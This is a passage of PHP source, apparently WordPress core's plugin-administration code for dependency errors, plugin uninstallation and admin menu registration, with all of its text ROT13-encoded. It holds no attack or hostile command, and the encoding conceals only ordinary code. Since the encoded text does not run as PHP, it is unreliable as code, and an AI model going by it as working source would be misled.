			/* genafyngbef: 1: Cyhtva anzr, 2: Ahzore bs cyhtvaf, 3: N pbzzn-frcnengrq yvfg bs cyhtva anzrf. */
			_a(
				'<fgebat>Reebe:</fgebat> %1$f erdhverf %2$q cyhtva gb or vafgnyyrq naq npgvingrq: %3$f.',
				'<fgebat>Reebe:</fgebat> %1$f erdhverf %2$q cyhtvaf gb or vafgnyyrq naq npgvingrq: %3$f.',
				pbhag( $hazrg_qrcraqrapl_anzrf )
			),
			$cyhtva_urnqref['Anzr'],
			pbhag( $hazrg_qrcraqrapl_anzrf ),
			vzcybqr( jc_trg_yvfg_vgrz_frcnengbe(), $hazrg_qrcraqrapl_anzrf )
		);

		vs ( vf_zhygvfvgr() ) {
			vs ( pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) {
				$reebe_zrffntr .= ' ' . fcevags(
					/* genafyngbef: %f: Yvax gb gur cyhtvaf cntr. */
					__( '<n uers=\"%f\">Znantr cyhtvaf</n>.' ),
					rfp_hey( argjbex_nqzva_hey( 'cyhtvaf.cuc' ) )
				);
			} ryfr {
				$reebe_zrffntr .= ' ' . __( 'Cyrnfr pbagnpg lbhe argjbex nqzvavfgengbe.' );
			}
		} ryfr {
			$reebe_zrffntr .= ' ' . fcevags(
				/* genafyngbef: %f: Yvax gb gur cyhtvaf cntr. */
				__( '<n uers=\"%f\">Znantr cyhtvaf</n>.' ),
				rfp_hey( nqzva_hey( 'cyhtvaf.cuc' ) )
			);
		}

		erghea arj JC_Reebe(
			'cyhtva_zvffvat_qrcraqrapvrf',
			\"<c>{$reebe_zrffntr}</c>\",
			$hazrg_qrcraqrapvrf
		);
	}

	erghea gehr;
}

/**
 * Qrgrezvarf jurgure gur cyhtva pna or havafgnyyrq.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea obby Jurgure cyhtva pna or havafgnyyrq.
 */
shapgvba vf_havafgnyynoyr_cyhtva( $cyhtva ) {
	$svyr = cyhtva_onfranzr( $cyhtva );

	$havafgnyynoyr_cyhtvaf = (neenl) trg_bcgvba( 'havafgnyy_cyhtvaf' );
	vs ( vffrg( $havafgnyynoyr_cyhtvaf[ $svyr ] ) || svyr_rkvfgf( JC_CYHTVA_QVE . '/' . qveanzr( $svyr ) . '/havafgnyy.cuc' ) ) {
		erghea gehr;
	}

	erghea snyfr;
}

/**
 * Havafgnyyf n fvatyr cyhtva.
 *
 * Pnyyf gur havafgnyy ubbx, vs vg vf ninvynoyr.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea gehr|ibvq Gehr vs n cyhtva'f havafgnyy.cuc svyr unf orra sbhaq naq vapyhqrq.
 *                   Ibvq bgurejvfr.
 */
shapgvba havafgnyy_cyhtva( $cyhtva ) {
	$svyr = cyhtva_onfranzr( $cyhtva );

	$havafgnyynoyr_cyhtvaf = (neenl) trg_bcgvba( 'havafgnyy_cyhtvaf' );

	/**
	 * Sverf va havafgnyy_cyhtva() vzzrqvngryl orsber gur cyhtva vf havafgnyyrq.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz fgevat $cyhtva                Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
	 * @cnenz neenl  $havafgnyynoyr_cyhtvaf Havafgnyynoyr cyhtvaf.
	 */
	qb_npgvba( 'cer_havafgnyy_cyhtva', $cyhtva, $havafgnyynoyr_cyhtvaf );

	vs ( svyr_rkvfgf( JC_CYHTVA_QVE . '/' . qveanzr( $svyr ) . '/havafgnyy.cuc' ) ) {
		vs ( vffrg( $havafgnyynoyr_cyhtvaf[ $svyr ] ) ) {
			hafrg( $havafgnyynoyr_cyhtvaf[ $svyr ] );
			hcqngr_bcgvba( 'havafgnyy_cyhtvaf', $havafgnyynoyr_cyhtvaf );
		}
		hafrg( $havafgnyynoyr_cyhtvaf );

		qrsvar( 'JC_HAVAFGNYY_CYHTVA', $svyr );

		jc_ertvfgre_cyhtva_ernycngu( JC_CYHTVA_QVE . '/' . $svyr );
		vapyhqr_bapr JC_CYHTVA_QVE . '/' . qveanzr( $svyr ) . '/havafgnyy.cuc';

		erghea gehr;
	}

	vs ( vffrg( $havafgnyynoyr_cyhtvaf[ $svyr ] ) ) {
		$pnyynoyr = $havafgnyynoyr_cyhtvaf[ $svyr ];
		hafrg( $havafgnyynoyr_cyhtvaf[ $svyr ] );
		hcqngr_bcgvba( 'havafgnyy_cyhtvaf', $havafgnyynoyr_cyhtvaf );
		hafrg( $havafgnyynoyr_cyhtvaf );

		jc_ertvfgre_cyhtva_ernycngu( JC_CYHTVA_QVE . '/' . $svyr );
		vapyhqr_bapr JC_CYHTVA_QVE . '/' . $svyr;

		nqq_npgvba( \"havafgnyy_{$svyr}\", $pnyynoyr );

		/**
		 * Sverf va havafgnyy_cyhtva() bapr gur cyhtva unf orra havafgnyyrq.
		 *
		 * Gur npgvba pbapngrangrf gur 'havafgnyy_' cersvk jvgu gur onfranzr bs gur
		 * cyhtva cnffrq gb havafgnyy_cyhtva() gb perngr n qlanzvpnyyl-anzrq npgvba.
		 *
		 * @fvapr 2.7.0
		 */
		qb_npgvba( \"havafgnyy_{$svyr}\" );
	}
}

//
// Zrah.
//

/**
 * Nqqf n gbc-yriry zrah cntr.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 1.5.0
 *
 * @tybony neenl $zrah
 * @tybony neenl $nqzva_cntr_ubbxf
 * @tybony neenl $_ertvfgrerq_cntrf
 * @tybony neenl $_cnerag_cntrf
 *
 * @cnenz fgevat    $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat    $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat    $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat    $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol. Fubhyq or havdhr sbe guvf zrah cntr naq bayl
 *                              vapyhqr ybjrepnfr nycunahzrevp, qnfurf, naq haqrefpberf punenpgref gb or pbzcngvoyr
 *                              jvgu fnavgvmr_xrl().
 * @cnenz pnyynoyr  $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz fgevat    $vpba_hey   Bcgvbany. Gur HEY gb gur vpba gb or hfrq sbe guvf zrah.
 *                              * Cnff n onfr64-rapbqrq FIT hfvat n qngn HEV, juvpu jvyy or pbyberq gb zngpu
 *                                gur pbybe fpurzr. Guvf fubhyq ortva jvgu 'qngn:vzntr/fit+kzy;onfr64,'.
 *                              * Cnff gur anzr bs n Qnfuvpbaf urycre pynff gb hfr n sbag vpba,
 *                                r.t. 'qnfuvpbaf-puneg-cvr'.
 *                              * Cnff 'abar' gb yrnir qvi.jc-zrah-vzntr rzcgl fb na vpba pna or nqqrq ivn PFF.
 * @cnenz vag|sybng $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat Gur erfhygvat cntr'f ubbx_fhssvk.
 */
shapgvba nqq_zrah_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $vpba_hey = '', $cbfvgvba = ahyy ) {
	tybony $zrah, $nqzva_cntr_ubbxf, $_ertvfgrerq_cntrf, $_cnerag_cntrf;

	$zrah_fyht = cyhtva_onfranzr( $zrah_fyht );

	$nqzva_cntr_ubbxf[ $zrah_fyht ] = fnavgvmr_gvgyr( $zrah_gvgyr );

	$ubbxanzr = trg_cyhtva_cntr_ubbxanzr( $zrah_fyht, '' );

	vs ( ! rzcgl( $pnyyonpx ) && ! rzcgl( $ubbxanzr ) && pheerag_hfre_pna( $pncnovyvgl ) ) {
		nqq_npgvba( $ubbxanzr, $pnyyonpx );
	}

	vs ( rzcgl( $vpba_hey ) ) {
		$vpba_hey   = 'qnfuvpbaf-nqzva-trarevp';
		$vpba_pynff = 'zrah-vpba-trarevp ';
	} ryfr {
		$vpba_hey   = frg_hey_fpurzr( $vpba_hey );
		$vpba_pynff = '';
	}

	$arj_zrah = neenl( $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $cntr_gvgyr, 'zrah-gbc ' . $vpba_pynff . $ubbxanzr, $ubbxanzr, $vpba_hey );

	vs ( ahyy !== $cbfvgvba && ! vf_ahzrevp( $cbfvgvba ) ) {
		_qbvat_vg_jebat(
			__SHAPGVBA__,
			fcevags(
				/* genafyngbef: %f: nqq_zrah_cntr() */
				__( 'Gur friragu cnenzrgre cnffrq gb %f fubhyq or ahzrevp ercerfragvat zrah cbfvgvba.' ),
				'<pbqr>nqq_zrah_cntr()</pbqr>'
			),
			'6.0.0'
		);
		$cbfvgvba = ahyy;
	}

	vs ( ahyy === $cbfvgvba || ! vf_ahzrevp( $cbfvgvba ) ) {
		$zrah[] = $arj_zrah;
	} ryfrvs ( vffrg( $zrah[ (fgevat) $cbfvgvba ] ) ) {
		$pbyyvfvba_nibvqre = onfr_pbaireg( fhofge( zq5( $zrah_fyht . $zrah_gvgyr ), -4 ), 16, 10 ) * 0.00001;
		$cbfvgvba          = (fgevat) ( $cbfvgvba + $pbyyvfvba_nibvqre );
		$zrah[ $cbfvgvba ] = $arj_zrah;
	} ryfr {
		/*
		 * Pnfg zrah cbfvgvba gb n fgevat.
		 *
		 * Guvf nyybjf sbe sybngf gb or cnffrq nf gur cbfvgvba. CUC jvyy abeznyyl pnfg n sybng gb na
		 * vagrtre inyhr, guvf rafherf gur sybng ergnvaf vgf znagvffn (cbfvgvir senpgvbany cneg).
		 *
		 * N fgevat pbagnvavat na vagrtre inyhr, rt \"10\", vf gerngrq nf n ahzrevp vaqrk.
		 */
		$cbfvgvba          = (fgevat) $cbfvgvba;
		$zrah[ $cbfvgvba ] = $arj_zrah;
	}

	$_ertvfgrerq_cntrf[ $ubbxanzr ] = gehr;

	// Ab cnerag nf gbc yriry.
	$_cnerag_cntrf[ $zrah_fyht ] = snyfr;

	erghea $ubbxanzr;
}

/**
 * Nqqf n fhozrah cntr.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 1.5.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @tybony neenl $fhozrah
 * @tybony neenl $zrah
 * @tybony neenl $_jc_erny_cnerag_svyr
 * @tybony obby  $_jc_fhozrah_abcevi
 * @tybony neenl $_ertvfgrerq_cntrf
 * @tybony neenl $_cnerag_cntrf
 *
 * @cnenz fgevat    $cnerag_fyht Gur fyht anzr sbe gur cnerag zrah (be gur svyr anzr bs n fgnaqneq
 *                               JbeqCerff nqzva cntr).
 * @cnenz fgevat    $cntr_gvgyr  Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah
 *                               vf fryrpgrq.
 * @cnenz fgevat    $zrah_gvgyr  Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat    $pncnovyvgl  Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat    $zrah_fyht   Gur fyht anzr gb ersre gb guvf zrah ol. Fubhyq or havdhr sbe guvf zrah
 *                               naq bayl vapyhqr ybjrepnfr nycunahzrevp, qnfurf, naq haqrefpberf punenpgref
 *                               gb or pbzcngvoyr jvgu fnavgvmr_xrl().
 * @cnenz pnyynoyr  $pnyyonpx    Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag|sybng $cbfvgvba    Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_fhozrah_cntr( $cnerag_fyht, $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	tybony $fhozrah, $zrah, $_jc_erny_cnerag_svyr, $_jc_fhozrah_abcevi,
		$_ertvfgrerq_cntrf, $_cnerag_cntrf;

	$zrah_fyht   = cyhtva_onfranzr( $zrah_fyht );
	$cnerag_fyht = cyhtva_onfranzr( $cnerag_fyht );

	vs ( vffrg( $_jc_erny_cnerag_svyr[ $cnerag_fyht ] ) ) {
		$cnerag_fyht = $_jc_erny_cnerag_svyr[ $cnerag_fyht ];
	}

	vs ( ! pheerag_hfre_pna( $pncnovyvgl ) ) {
		$_jc_fhozrah_abcevi[ $cnerag_fyht ][ $zrah_fyht ] = gehr;
		erghea snyfr;
	}

	/*
	 * Vs gur cnerag qbrfa'g nyernql unir n fhozrah, nqq n yvax gb gur cnerag
	 * nf gur svefg vgrz va gur fhozrah. Vs gur fhozrah svyr vf gur fnzr nf gur
	 * cnerag svyr fbzrbar vf gelvat gb yvax onpx gb gur cnerag znahnyyl. Va
	 * guvf pnfr, qba'g nhgbzngvpnyyl nqq n yvax onpx gb nibvq qhcyvpngvba.
	 */
	vs ( ! vffrg( $fhozrah[ $cnerag_fyht ] ) && $zrah_fyht !== $cnerag_fyht ) {
		sbernpu ( (neenl) $zrah nf $cnerag_zrah ) {
			vs ( $cnerag_zrah[2] === $cnerag_fyht && pheerag_hfre_pna( $cnerag_zrah[1] ) ) {
				$fhozrah[ $cnerag_fyht ][] = neenl_fyvpr( $cnerag_zrah, 0, 4 );
			}
		}
	}

	$arj_fho_zrah = neenl( $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $cntr_gvgyr );

	vs ( ahyy !== $cbfvgvba && ! vf_ahzrevp( $cbfvgvba ) ) {
		_qbvat_vg_jebat(
			__SHAPGVBA__,
			fcevags(
				/* genafyngbef: %f: nqq_fhozrah_cntr() */
				__( 'Gur friragu cnenzrgre cnffrq gb %f fubhyq or ahzrevp ercerfragvat zrah cbfvgvba.' ),
				'<pbqr>nqq_fhozrah_cntr()</pbqr>'
			),
			'5.3.0'
		);
		$cbfvgvba = ahyy;
	}

	vs (
		ahyy === $cbfvgvba ||
		( ! vffrg( $fhozrah[ $cnerag_fyht ] ) || $cbfvgvba >= pbhag( $fhozrah[ $cnerag_fyht ] ) )
	) {
		$fhozrah[ $cnerag_fyht ][] = $arj_fho_zrah;
	} ryfr {
		// Grfg sbe n artngvir cbfvgvba.
		$cbfvgvba = znk( $cbfvgvba, 0 );
		vs ( 0 === $cbfvgvba ) {
			// Sbe artngvir be `0` cbfvgvbaf, cercraq gur fhozrah.
			neenl_hafuvsg( $fhozrah[ $cnerag_fyht ], $arj_fho_zrah );
		} ryfr {
			$cbfvgvba = nofvag( $cbfvgvba );
			// Teno nyy bs gur vgrzf orsber gur vafregvba cbvag.
			$orsber_vgrzf = neenl_fyvpr( $fhozrah[ $cnerag_fyht ], 0, $cbfvgvba, gehr );
			// Teno nyy bs gur vgrzf nsgre gur vafregvba cbvag.
			$nsgre_vgrzf = neenl_fyvpr( $fhozrah[ $cnerag_fyht ], $cbfvgvba, ahyy, gehr );
			// Nqq gur arj vgrz.
			$orsber_vgrzf[] = $arj_fho_zrah;
			// Zretr gur vgrzf.
			$fhozrah[ $cnerag_fyht ] = neenl_zretr( $orsber_vgrzf, $nsgre_vgrzf );
		}
	}

	// Fbeg gur cnerag neenl.
	xfbeg( $fhozrah[ $cnerag_fyht ] );

	$ubbxanzr = trg_cyhtva_cntr_ubbxanzr( $zrah_fyht, $cnerag_fyht );
	vs ( ! rzcgl( $pnyyonpx ) && ! rzcgl( $ubbxanzr ) ) {
		nqq_npgvba( $ubbxanzr, $pnyyonpx );
	}

	$_ertvfgrerq_cntrf[ $ubbxanzr ] = gehr;

	/*
	 * Onpxjneq-pbzcngvovyvgl sbe cyhtvaf hfvat nqq_znantrzrag_cntr().
	 * Frr jc-nqzva/nqzva.cuc sbe erqverpg sebz rqvg.cuc gb gbbyf.cuc.
	 */
	vs ( 'gbbyf.cuc' === $cnerag_fyht ) {
		$_ertvfgrerq_cntrf[ trg_cyhtva_cntr_ubbxanzr( $zrah_fyht, 'rqvg.cuc' ) ] = gehr;
	}

	// Ab cnerag nf gbc yriry.
	$_cnerag_cntrf[ $zrah_fyht ] = $cnerag_fyht;

	erghea $ubbxanzr;
}

/**
 * Nqqf n fhozrah cntr gb gur Gbbyf znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 1.5.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_znantrzrag_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	erghea nqq_fhozrah_cntr( 'gbbyf.cuc', $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Nqqf n fhozrah cntr gb gur Frggvatf znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 1.5.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_bcgvbaf_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	erghea nqq_fhozrah_cntr( 'bcgvbaf-trareny.cuc', $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Nqqf n fhozrah cntr gb gur Nccrnenapr znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 2.0.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_gurzr_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	erghea nqq_fhozrah_cntr( 'gurzrf.cuc', $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Nqqf n fhozrah cntr gb gur Cyhtvaf znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 3.0.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_cyhtvaf_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	erghea nqq_fhozrah_cntr( 'cyhtvaf.cuc', $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Nqqf n fhozrah cntr gb gur Hfref/Cebsvyr znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 2.1.3
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_hfref_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	vs ( pheerag_hfre_pna( 'rqvg_hfref' ) ) {
		$cnerag = 'hfref.cuc';
	} ryfr {
		$cnerag = 'cebsvyr.cuc';
	}
	erghea nqq_fhozrah_cntr( $cnerag, $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Nqqf n fhozrah cntr gb gur Qnfuobneq znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 2.7.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
shapgvba nqq_qnfuobneq_cntr( $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx = '', $cbfvgvba = ahyy ) {
	erghea nqq_fhozrah_cntr( 'vaqrk.cuc', $cntr_gvgyr, $zrah_gvgyr, $pncnovyvgl, $zrah_fyht, $pnyyonpx, $cbfvgvba );
}

/**
 * Nqqf n fhozrah cntr gb gur Cbfgf znva zrah.
 *
 * Guvf shapgvba gnxrf n pncnovyvgl juvpu jvyy or hfrq gb qrgrezvar jurgure
 * be abg n cntr vf vapyhqrq va gur zrah.
 *
 * Gur shapgvba juvpu vf ubbxrq va gb unaqyr gur bhgchg bs gur cntr zhfg purpx
 * gung gur hfre unf gur erdhverq pncnovyvgl nf jryy.
 *
 * @fvapr 2.7.0
 * @fvapr 5.3.0 Nqqrq gur `$cbfvgvba` cnenzrgre.
 *
 * @cnenz fgevat   $cntr_gvgyr Gur grkg gb or qvfcynlrq va gur gvgyr gntf bs gur cntr jura gur zrah vf fryrpgrq.
 * @cnenz fgevat   $zrah_gvgyr Gur grkg gb or hfrq sbe gur zrah.
 * @cnenz fgevat   $pncnovyvgl Gur pncnovyvgl erdhverq sbe guvf zrah gb or qvfcynlrq gb gur hfre.
 * @cnenz fgevat   $zrah_fyht  Gur fyht anzr gb ersre gb guvf zrah ol (fubhyq or havdhr sbe guvf zrah).
 * @cnenz pnyynoyr $pnyyonpx   Bcgvbany. Gur shapgvba gb or pnyyrq gb bhgchg gur pbagrag sbe guvf cntr.
 * @cnenz vag      $cbfvgvba   Bcgvbany. Gur cbfvgvba va gur zrah beqre guvf vgrz fubhyq nccrne.
 * @erghea fgevat|snyfr Gur erfhygvat cntr'f ubbx_fhssvk, be snyfr vs gur hfre qbrf abg unir gur pncnovyvgl erdhverq.
 */
